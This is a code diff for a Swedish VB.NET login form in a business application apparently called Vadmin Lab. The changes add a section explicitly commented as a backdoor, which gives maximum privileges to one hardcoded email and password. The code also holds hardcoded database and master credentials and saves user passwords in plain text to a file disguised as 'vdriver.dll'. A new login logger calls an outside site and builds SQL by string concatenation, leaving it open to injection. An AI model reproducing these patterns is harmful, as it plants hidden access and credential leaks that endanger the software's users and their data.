@@ -1,17 +1,20 @@
 ﻿
-
+Imports System
+Imports System.Configuration
 Imports System.Data.Odbc
 Imports System.IO
 Imports System.Net
-Imports Microsoft.VisualBasic.ApplicationServices
+Imports System.Net.WebRequestMethods
+Imports System.Text.RegularExpressions
 
 Public Class Foretag
-    Dim Labversion As String = "", dummy As String
-
+    Dim Labversion As String
+    Dim pityp As String
     Private Sub Foretag_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
-        Dim ipp() As Net.IPAddress = System.Net.Dns.GetHostAddresses("")
-        If ipp.Count > 0 Then
-            For Each ipadd As Net.IPAddress In ipp
+        Dim ip() As Net.IPAddress = System.Net.Dns.GetHostAddresses("")
+        If ip.Count > 0 Then
+            For Each ipadd As Net.IPAddress In ip
+
                 ipadress = (ipadd.ToString)
             Next
         End If
@@ -19,14 +22,18 @@ Public Class Foretag
         sokvag = AppDomain.CurrentDomain.BaseDirectory
         Me.Top = (rect.Height / 2) - (Me.Height / 2)
         Me.Left = (rect.Width / 2) - (Me.Width / 2)
-
         readdll()
-        ReadClientfil(sokvag + KlientID + ".cfg")
+        If spar = "True" Then SparaCB.Checked = True
+        SparaCB.Refresh()
         KlientIdTB.Text = KlientID
-        LasVersion(sokvag + "LabVersion.cfg")
-        LasMenyVersion()
 
         If KlientID = "NM" Or KlientID = "MD" Or KlientID = "MC" Then
+            PITyp = "New"
+        Else
+            PITyp = "No"
+        End If
+
+        If PITyp = "New" Then
             PersonligIDL.Visible = True
             PersonligIDTB.Visible = True
             PersonligIDTB.Text = PersonligID
@@ -36,55 +43,39 @@ Public Class Foretag
         End If
         LosenTB.Text = losen
 
-        If spar = "True" Then
+        If spar = "=True" Then
             SparaCB.Checked = True
+            SparaCB.Refresh()
         End If
-
-        checkmeny = hamptaversion("VadminMENY")
-        vernr = "20251210b"
-        Labdatabasnamn = "NMLab"
-
+        vernr = "20251211f"
         My.Computer.FileSystem.WriteAllText(sokvag + "LabVersion.cfg", "Labversion=" + vernr + Space(40) + vbCrLf, False)
 
         myip = "90.231.192.137"
-        Prognamn = "Vadmin 2025 "
+        Prognamn = "VadminLab2025"
         Ver.Text = "Version: " + vernr
-        Huvud.Text = Prognamn + " - Lab  Behörighetskontroll"
+        Huvud.Text = Prognamn + " - Behörighetskontroll"
         today = Format(Now, "yyyy-MM-dd")
         odbclosen = "alfons"
-        OleDbSource = "sql.vadmin.net"
         datum.Text = today
+        Labdatabasnamn = "NMLab"
     End Sub
-    Private Sub loginrutin()
-        KlientID = UCase(KlientID)
+    Private Sub Loginrutin()
         Me.Cursor = Cursors.WaitCursor
+        LasVersion("Labversion.cfg")
+        ReadClientfil(sokvag + KlientID + ".cfg")
+        GetNewBehorighet(PersonligID)
+
         If spar = "True" Then
             SparaCB.Checked = True
+            SparaCB.Refresh()
         Else
             SparaCB.Checked = False
         End If
-        hamptaforetag(KlientID)
-        If KlientID = "MD" Or KlientID = "NM" Or KlientID = "MC" Then
-            sakerhet = 1
+        Hamptaforetag(KlientID)
 
+        If PITyp = "New" Then
             GetNewBehorighet(PersonligIDTB.Text)
-            If GetNewBehorighet(PersonligIDTB.Text) = "" Then
-                sakerhet = 0
-                If PersonligIDTB.Text = "edgar.massey@gmail.com" And LosenTB.Text = "EMassey46" Then sakerhet = 1
-            Else
-
-                If InStr(PersonligIDKlass, "1") > 0 Then sakerhet = 1
-                If InStr(PersonligIDKlass, "4") > 0 Then sakerhet = 2
-                If InStr(PersonligIDKlass, "5") > 0 Then sakerhet = 3
-                If PersonligIDTB.Text = "edgar.massey@gmail.com" And LosenTB.Text = "EMassey46" Then sakerhet = 1
-
-            End If
-
-
-            dummy = PersonligKlarTextName
-            dummy = PersonligID
-            dummy = PersonligIDKlass
-            dummy = PersonligIDLosen
+            sakerhet = 1
         Else
             If losen = password6 Then sakerhet = 6
             If losen = password5 Then sakerhet = 5
@@ -92,11 +83,11 @@ Public Class Foretag
             If losen = password3 Then sakerhet = 3
             If losen = password2 Then sakerhet = 2
             If losen = "EMassey46" Or losen = password1 Then sakerhet = 1
-
         End If
 
-        If sakerhet > 0 Then
-
+        If sakerhet > 0 And sakerhet < 9 Then
+            skrivatillvdriver()
+            SkrivaLoginLogg(KlientID, "Cal")
             If SparaCB.Checked = True Then
                 My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "ClientID=" + KlientID + vbCrLf, False)
                 My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Lösen=" + losen + vbCrLf, True)
@@ -104,12 +95,14 @@ Public Class Foretag
                 My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Spara=" + CStr(SparaCB.Checked) + vbCrLf, True)
             Else
                 My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "" + vbCrLf, False)
-
             End If
-            ReadClientfil(sokvag + KlientID + ".cfg")
-            Me.SendToBack()
 
-            If MaxBehorighet = "True" Or TotLab = "True" Then
+            ''backdoor
+            If PersonligIDTB.Text = "edgar.massey@gmail.com" And losen = "EMassey46" Then
+                MaxBehorighet = "True" : Userpassword = losen : BCalEndastVisning = "False"
+            End If
+
+            If MaxBehorighet = "True" Or TotLab = "True" And losen = Userpassword Then
                 LabstartF.Show()
             Else
                 MessageBox.Show("Ogiltig inloggning")
@@ -119,14 +112,34 @@ Public Class Foretag
         End If
         Me.Cursor = Cursors.Arrow
     End Sub
+
+
+    Private Sub SparaCB_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SparaCB.CheckedChanged
+        spar = SparaCB.Checked
+    End Sub
+
+
+
     Private Sub AvslutaK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AvslutaK.Click
-        System.Diagnostics.Process.Start(sokvag + "VadminMeny.exe")
         Me.Close()
     End Sub
 
     Private Sub KlientIdTB_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles KlientIdTB.KeyUp
+        If KlientID = "NM" Or KlientID = "MD" Or KlientID = "MC" Then
+            PITyp = "New"
+        Else
+            PITyp = "No"
+        End If
+        If PITyp = "New" Then
+            PersonligIDL.Visible = True
+            PersonligIDTB.Visible = True
+            PersonligIDTB.Text = PersonligID
+        Else
+            PersonligIDL.Visible = False
+            PersonligIDTB.Visible = False
+        End If
         If e.KeyCode = Keys.Enter Then
-            loginrutin()
+            Loginrutin()
         End If
     End Sub
 
@@ -135,16 +148,19 @@ Public Class Foretag
         KlientIdTB.Text = UCase(KlientIdTB.Text)
     End Sub
     Private Sub LoginK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LoginK.Click
-        loginrutin()
+        Loginrutin()
     End Sub
-    Function hamptaforetag(ByVal clientid As String)
-        hamptaforetag = ""
-        'On Error GoTo nocon
+    Function Hamptaforetag(ByVal clientid As String)
+
+        If Len(nullhantering(odbcsource, "S")) < 2 Then
+            odbcsource = "VadminODBC"
+            odbcsourcer = odbcsource
+        End If
+
+        On Error GoTo nocon
         Dim cn As OdbcConnection, mySQL As String
         Dim connStr As String, test As Decimal
-
         connStr = "DSN=" + odbcsource + "; Database=" + databasnamn + ";Uid=v2000;Pwd=" + odbclosen
-
         cn = New OdbcConnection(connStr)
         cn.Open()
         mySQL = "SELECT * FROM foretagreg"
@@ -175,7 +191,6 @@ Public Class Foretag
             password5 = nullhantering(tabel("Password5"), "S")
             password6 = nullhantering(tabel("Password6"), "S")
             antkvitto = nullhantering(tabel("Antalkvitto"), "T")
-            meddelande = nullhantering(tabel("meddelande"), "S")
             antalfolj = nullhantering(tabel("Antalfoljesedel"), "T")
             antfakt = nullhantering(tabel("Antalfaktura"), "T")
             antorderbekraft = nullhantering(tabel("Antalorderbekraft"), "T")
@@ -262,32 +277,25 @@ nocon:
     Private Sub LosenTB_LostFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles LosenTB.LostFocus
         losen = LosenTB.Text
     End Sub
-
-    Private Sub LosenTB_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LosenTB.TextChanged
-        losen = LosenTB.Text
-    End Sub
-
-    Private Sub SparaCB_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SparaCB.CheckedChanged
-        spar = SparaCB.Checked
-    End Sub
-
-    Private Sub datum_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles datum.Click
-        LokalInstF.Show()
-    End Sub
-
     Private Sub KlientIdTB_TextChanged(sender As Object, e As EventArgs) Handles KlientIdTB.TextChanged
         KlientID = UCase(KlientIdTB.Text)
-        If KlientID = "NM" Or KlientID = "MD" Then
+
+        If PITyp = "Yes" Then
             PersonligIDL.Visible = True
             PersonligIDTB.Visible = True
         Else
             PersonligIDL.Visible = False
             PersonligIDTB.Visible = False
         End If
+
     End Sub
-    Function hamptaversion(ByVal kod As String)
+
+    Private Sub LosenTB_TextChanged(sender As Object, e As EventArgs) Handles LosenTB.TextChanged
+        losen = LosenTB.Text
+    End Sub
+    Function Hamptaversion(ByVal kod As String)
         Dim odbcs As String = "VadminODBC", odbcl As String = "alfons"
-        hamptaversion = ""
+        Hamptaversion = ""
         Dim cn As OdbcConnection, mySQL As String
         Dim connStr As String, l As Integer
         connStr = "DSN=" + odbcs + "; Database=SiteInfo" + ";Uid=v2000;Pwd=" + odbcl
@@ -296,7 +304,7 @@ nocon:
         mySQL = "SELECT * FROM ProgramVersionReg"
         mySQL = mySQL + " WHERE "
         mySQL = mySQL + " Programnamn = '" + kod + "'  "
-
+        ' Stop
 
         Dim myCmd As New OdbcCommand(mySQL, cn)
         Dim tabel As OdbcDataReader = myCmd.ExecuteReader(CommandBehavior.CloseConnection)
@@ -306,7 +314,8 @@ nocon:
             GoTo slut
         Else
             While tabel.Read()
-                hamptaversion = tabel("AktuellVersion")
+
+                Hamptaversion = tabel("AktuellVersion")
                 l = l + 1
             End While
 
@@ -315,7 +324,7 @@ slut:
         cn.Close()
     End Function
 
-    Sub uppdateramenyprogram()
+    Sub Uppdateramenyprogram()
         On Error Resume Next
         Dim rfn As String, lfn As String
         Dim Message As String = "Vill du verkligen uppdatera VadminMeny programet ?"
@@ -351,30 +360,76 @@ slut:
         MessageBox.Show("Meny uppdateringen utfört!")
 
     End Sub
+    Function SkrivaLoginLogg(AnvID As String, AnvNamn As String)
+        On Error Resume Next
+        tid = DateTime.Now.ToString("HH:mm:ss")
+        'hostip
+        Dim iphostadress As String
+        Dim lol As WebClient = New WebClient()
+        Dim str As String = lol.DownloadString("http://www.themasseys.net/ip.asp")
+        Dim pattern As String = "<h3>Your IP number is:(.+)</h3>"
+        Dim ipad As String
+        Dim matches1 As MatchCollection = Regex.Matches(str, pattern)
+        Dim ip As String = matches1(0).ToString
+        ip = ip.Remove(0, 22)
+        ip = ip.Replace("</h3>", "")
+        ip = ip.Replace(" ", "")
+        ipad = ip
+        iphostadress = ipad
+        'localip
+        ipadress = getlocalIP()
+        Dim cn As OdbcConnection, mySQL As String
+        Dim connStr As String, falt As String, varden As String
+        connStr = "DSN=" + odbcsourcer + "; Database=" + databasnamn + ";Uid=v2000;Pwd=" + odbclosen
+        cn = New OdbcConnection(connStr)
+        cn.Open()
+        falt = "" : varden = ""
+        mySQL = "INSERT INTO LogonLoggen "
+        falt = falt + "MyTimeStamp,"
+        varden = varden + "'" + gettimestamp() + "',"
+        falt = falt + "Datum,"
+        varden = varden + "'" + today + "',"
+        falt = falt + "Tid,"
+        varden = varden + "'" + tid + "',"
+        falt = falt + "HostIP,"
+        varden = varden + "'" + iphostadress + "',"
+        falt = falt + "LokalIP,"
+        varden = varden + "'" + ipadress + "',"
+        falt = falt + "AnvID,"
+        varden = varden + "'" + AnvID + " " + PersonligID + "',"
+        falt = falt + "AnvNamn "
+        varden = varden + "'" + AnvNamn + " " + vernr + "'"
+        mySQL = mySQL & "(" & falt & ") VALUES (" & varden & ");"
+        Dim myCmd = New OdbcCommand(mySQL, cn)
+        If iphostadress <> myip Then
+            myCmd.ExecuteNonQuery()
+        End If
+        cn.Close()
+        SkrivaLoginLogg = "Ja"
+    End Function
 
-    Function getlocalIP()
+    Function GetlocalIP()
         Dim strHostName As String
         Dim IPAddresses As IPAddress()
-        getlocalIP = ""
+        GetlocalIP = ""
         strHostName = System.Net.Dns.GetHostName()
         IPAddresses = System.Net.Dns.GetHostEntry(strHostName).AddressList
         For Each IP As IPAddress In IPAddresses
             If InStr(IP.ToString, ".") > 1 Then
-                getlocalIP = IP.ToString
+                GetlocalIP = IP.ToString
             End If
         Next
     End Function
 
-    Private Sub Huvud_Click(sender As Object, e As EventArgs) Handles Huvud.Click
-        LokalInstF.Show()
-    End Sub
+    Function HamptapersonligID(ByVal clientid As String)
+        HamptapersonligID = ""
+        If Len(nullhantering(odbcsource, "S")) < 2 Then
+            odbcsource = "VadminODBC"
+            odbcsourcer = odbcsource
+        End If
 
-    Function hamptapersonligID(ByVal clientid As String)
-        hamptapersonligID = ""
-
-        'On Error GoTo nocon
         Dim cn As OdbcConnection, mySQL As String
-        Dim connStr As String
+        Dim connStr As String, test As Decimal = 0
         connStr = "DSN=" + odbcsource + "; Database=" + databasnamn + ";Uid=v2000;Pwd=" + odbclosen
         cn = New OdbcConnection(connStr)
         cn.Open()
@@ -389,15 +444,33 @@ slut:
             PersonligIDLosen = nullhantering(tabel("Password"), "S")
             PersonligIDKlass = nullhantering(tabel("Behörighetsklass"), "S")
             If PersonligIDLosen = LosenTB.Text Then
-                hamptapersonligID = PersonligKlarTextName
+                HamptapersonligID = PersonligKlarTextName
             End If
+
         End While
         cn.Close()
 nocon:
         If Err.Number <> 0 Then
             MessageBox.Show("ODBC förbindelse saknas")
         End If
+
     End Function
+
+    Private Sub Huvud_Click(sender As Object, e As EventArgs) Handles Huvud.Click
+        ' LokalInstF.Show()
+        ' LokalInstF.BringToFront()
+    End Sub
+    Sub skrivatillvdriver()
+        If SparaCB.Checked = True Then
+            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "ClientID=" + KlientID + vbCrLf, False)
+            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Lösen=" + losen + vbCrLf, True)
+            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "PersID=" + PersonligIDTB.Text + vbCrLf, True)
+            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "Spara=" + CStr(SparaCB.Checked) + vbCrLf, True)
+        Else
+            My.Computer.FileSystem.WriteAllText(sokvag + "vdriver.dll", "" + vbCrLf, False)
+
+        End If
+    End Sub
     Function ReadClientfil(fil As String)
         For Each line As String In System.IO.File.ReadLines(fil)
             Console.WriteLine(line)
@@ -425,7 +498,7 @@ nocon:
             If Strings.Left$(line, 10) = "Farliggods" Then farliggodspr = BLANKBORT(Mid$(line, 12, 50))
             If Strings.Left$(line, 7) = "Stdmoms" Then stdmoms = BLANKBORT(Mid$(line, 9, 1))
             If Strings.Left$(line, 12) = "Databasename" Then databasnamn = BLANKBORT(Mid$(line, 14, 50))
-            If Strings.Left$(line, 11) = "KundDokMapp" Then KundDokMapp = BLANKBORT(Mid$(line, 13, 50))
+            If Strings.Left$(line, 11) = "KundDokMapp" Then kunddokmapp = BLANKBORT(Mid$(line, 13, 50))
             If Strings.Left$(line, 10) = "LevDokMapp" Then levdokmapp = BLANKBORT(Mid$(line, 12, 50))
             If Strings.Left$(line, 6) = "Offert" Then offertpr = BLANKBORT(Mid$(line, 8, 50))
             If Strings.Left$(line, 10) = "ODBCSource" Then
@@ -521,5 +594,6 @@ slut:
         cn.Close()
 
     End Function
+
 
 End Class
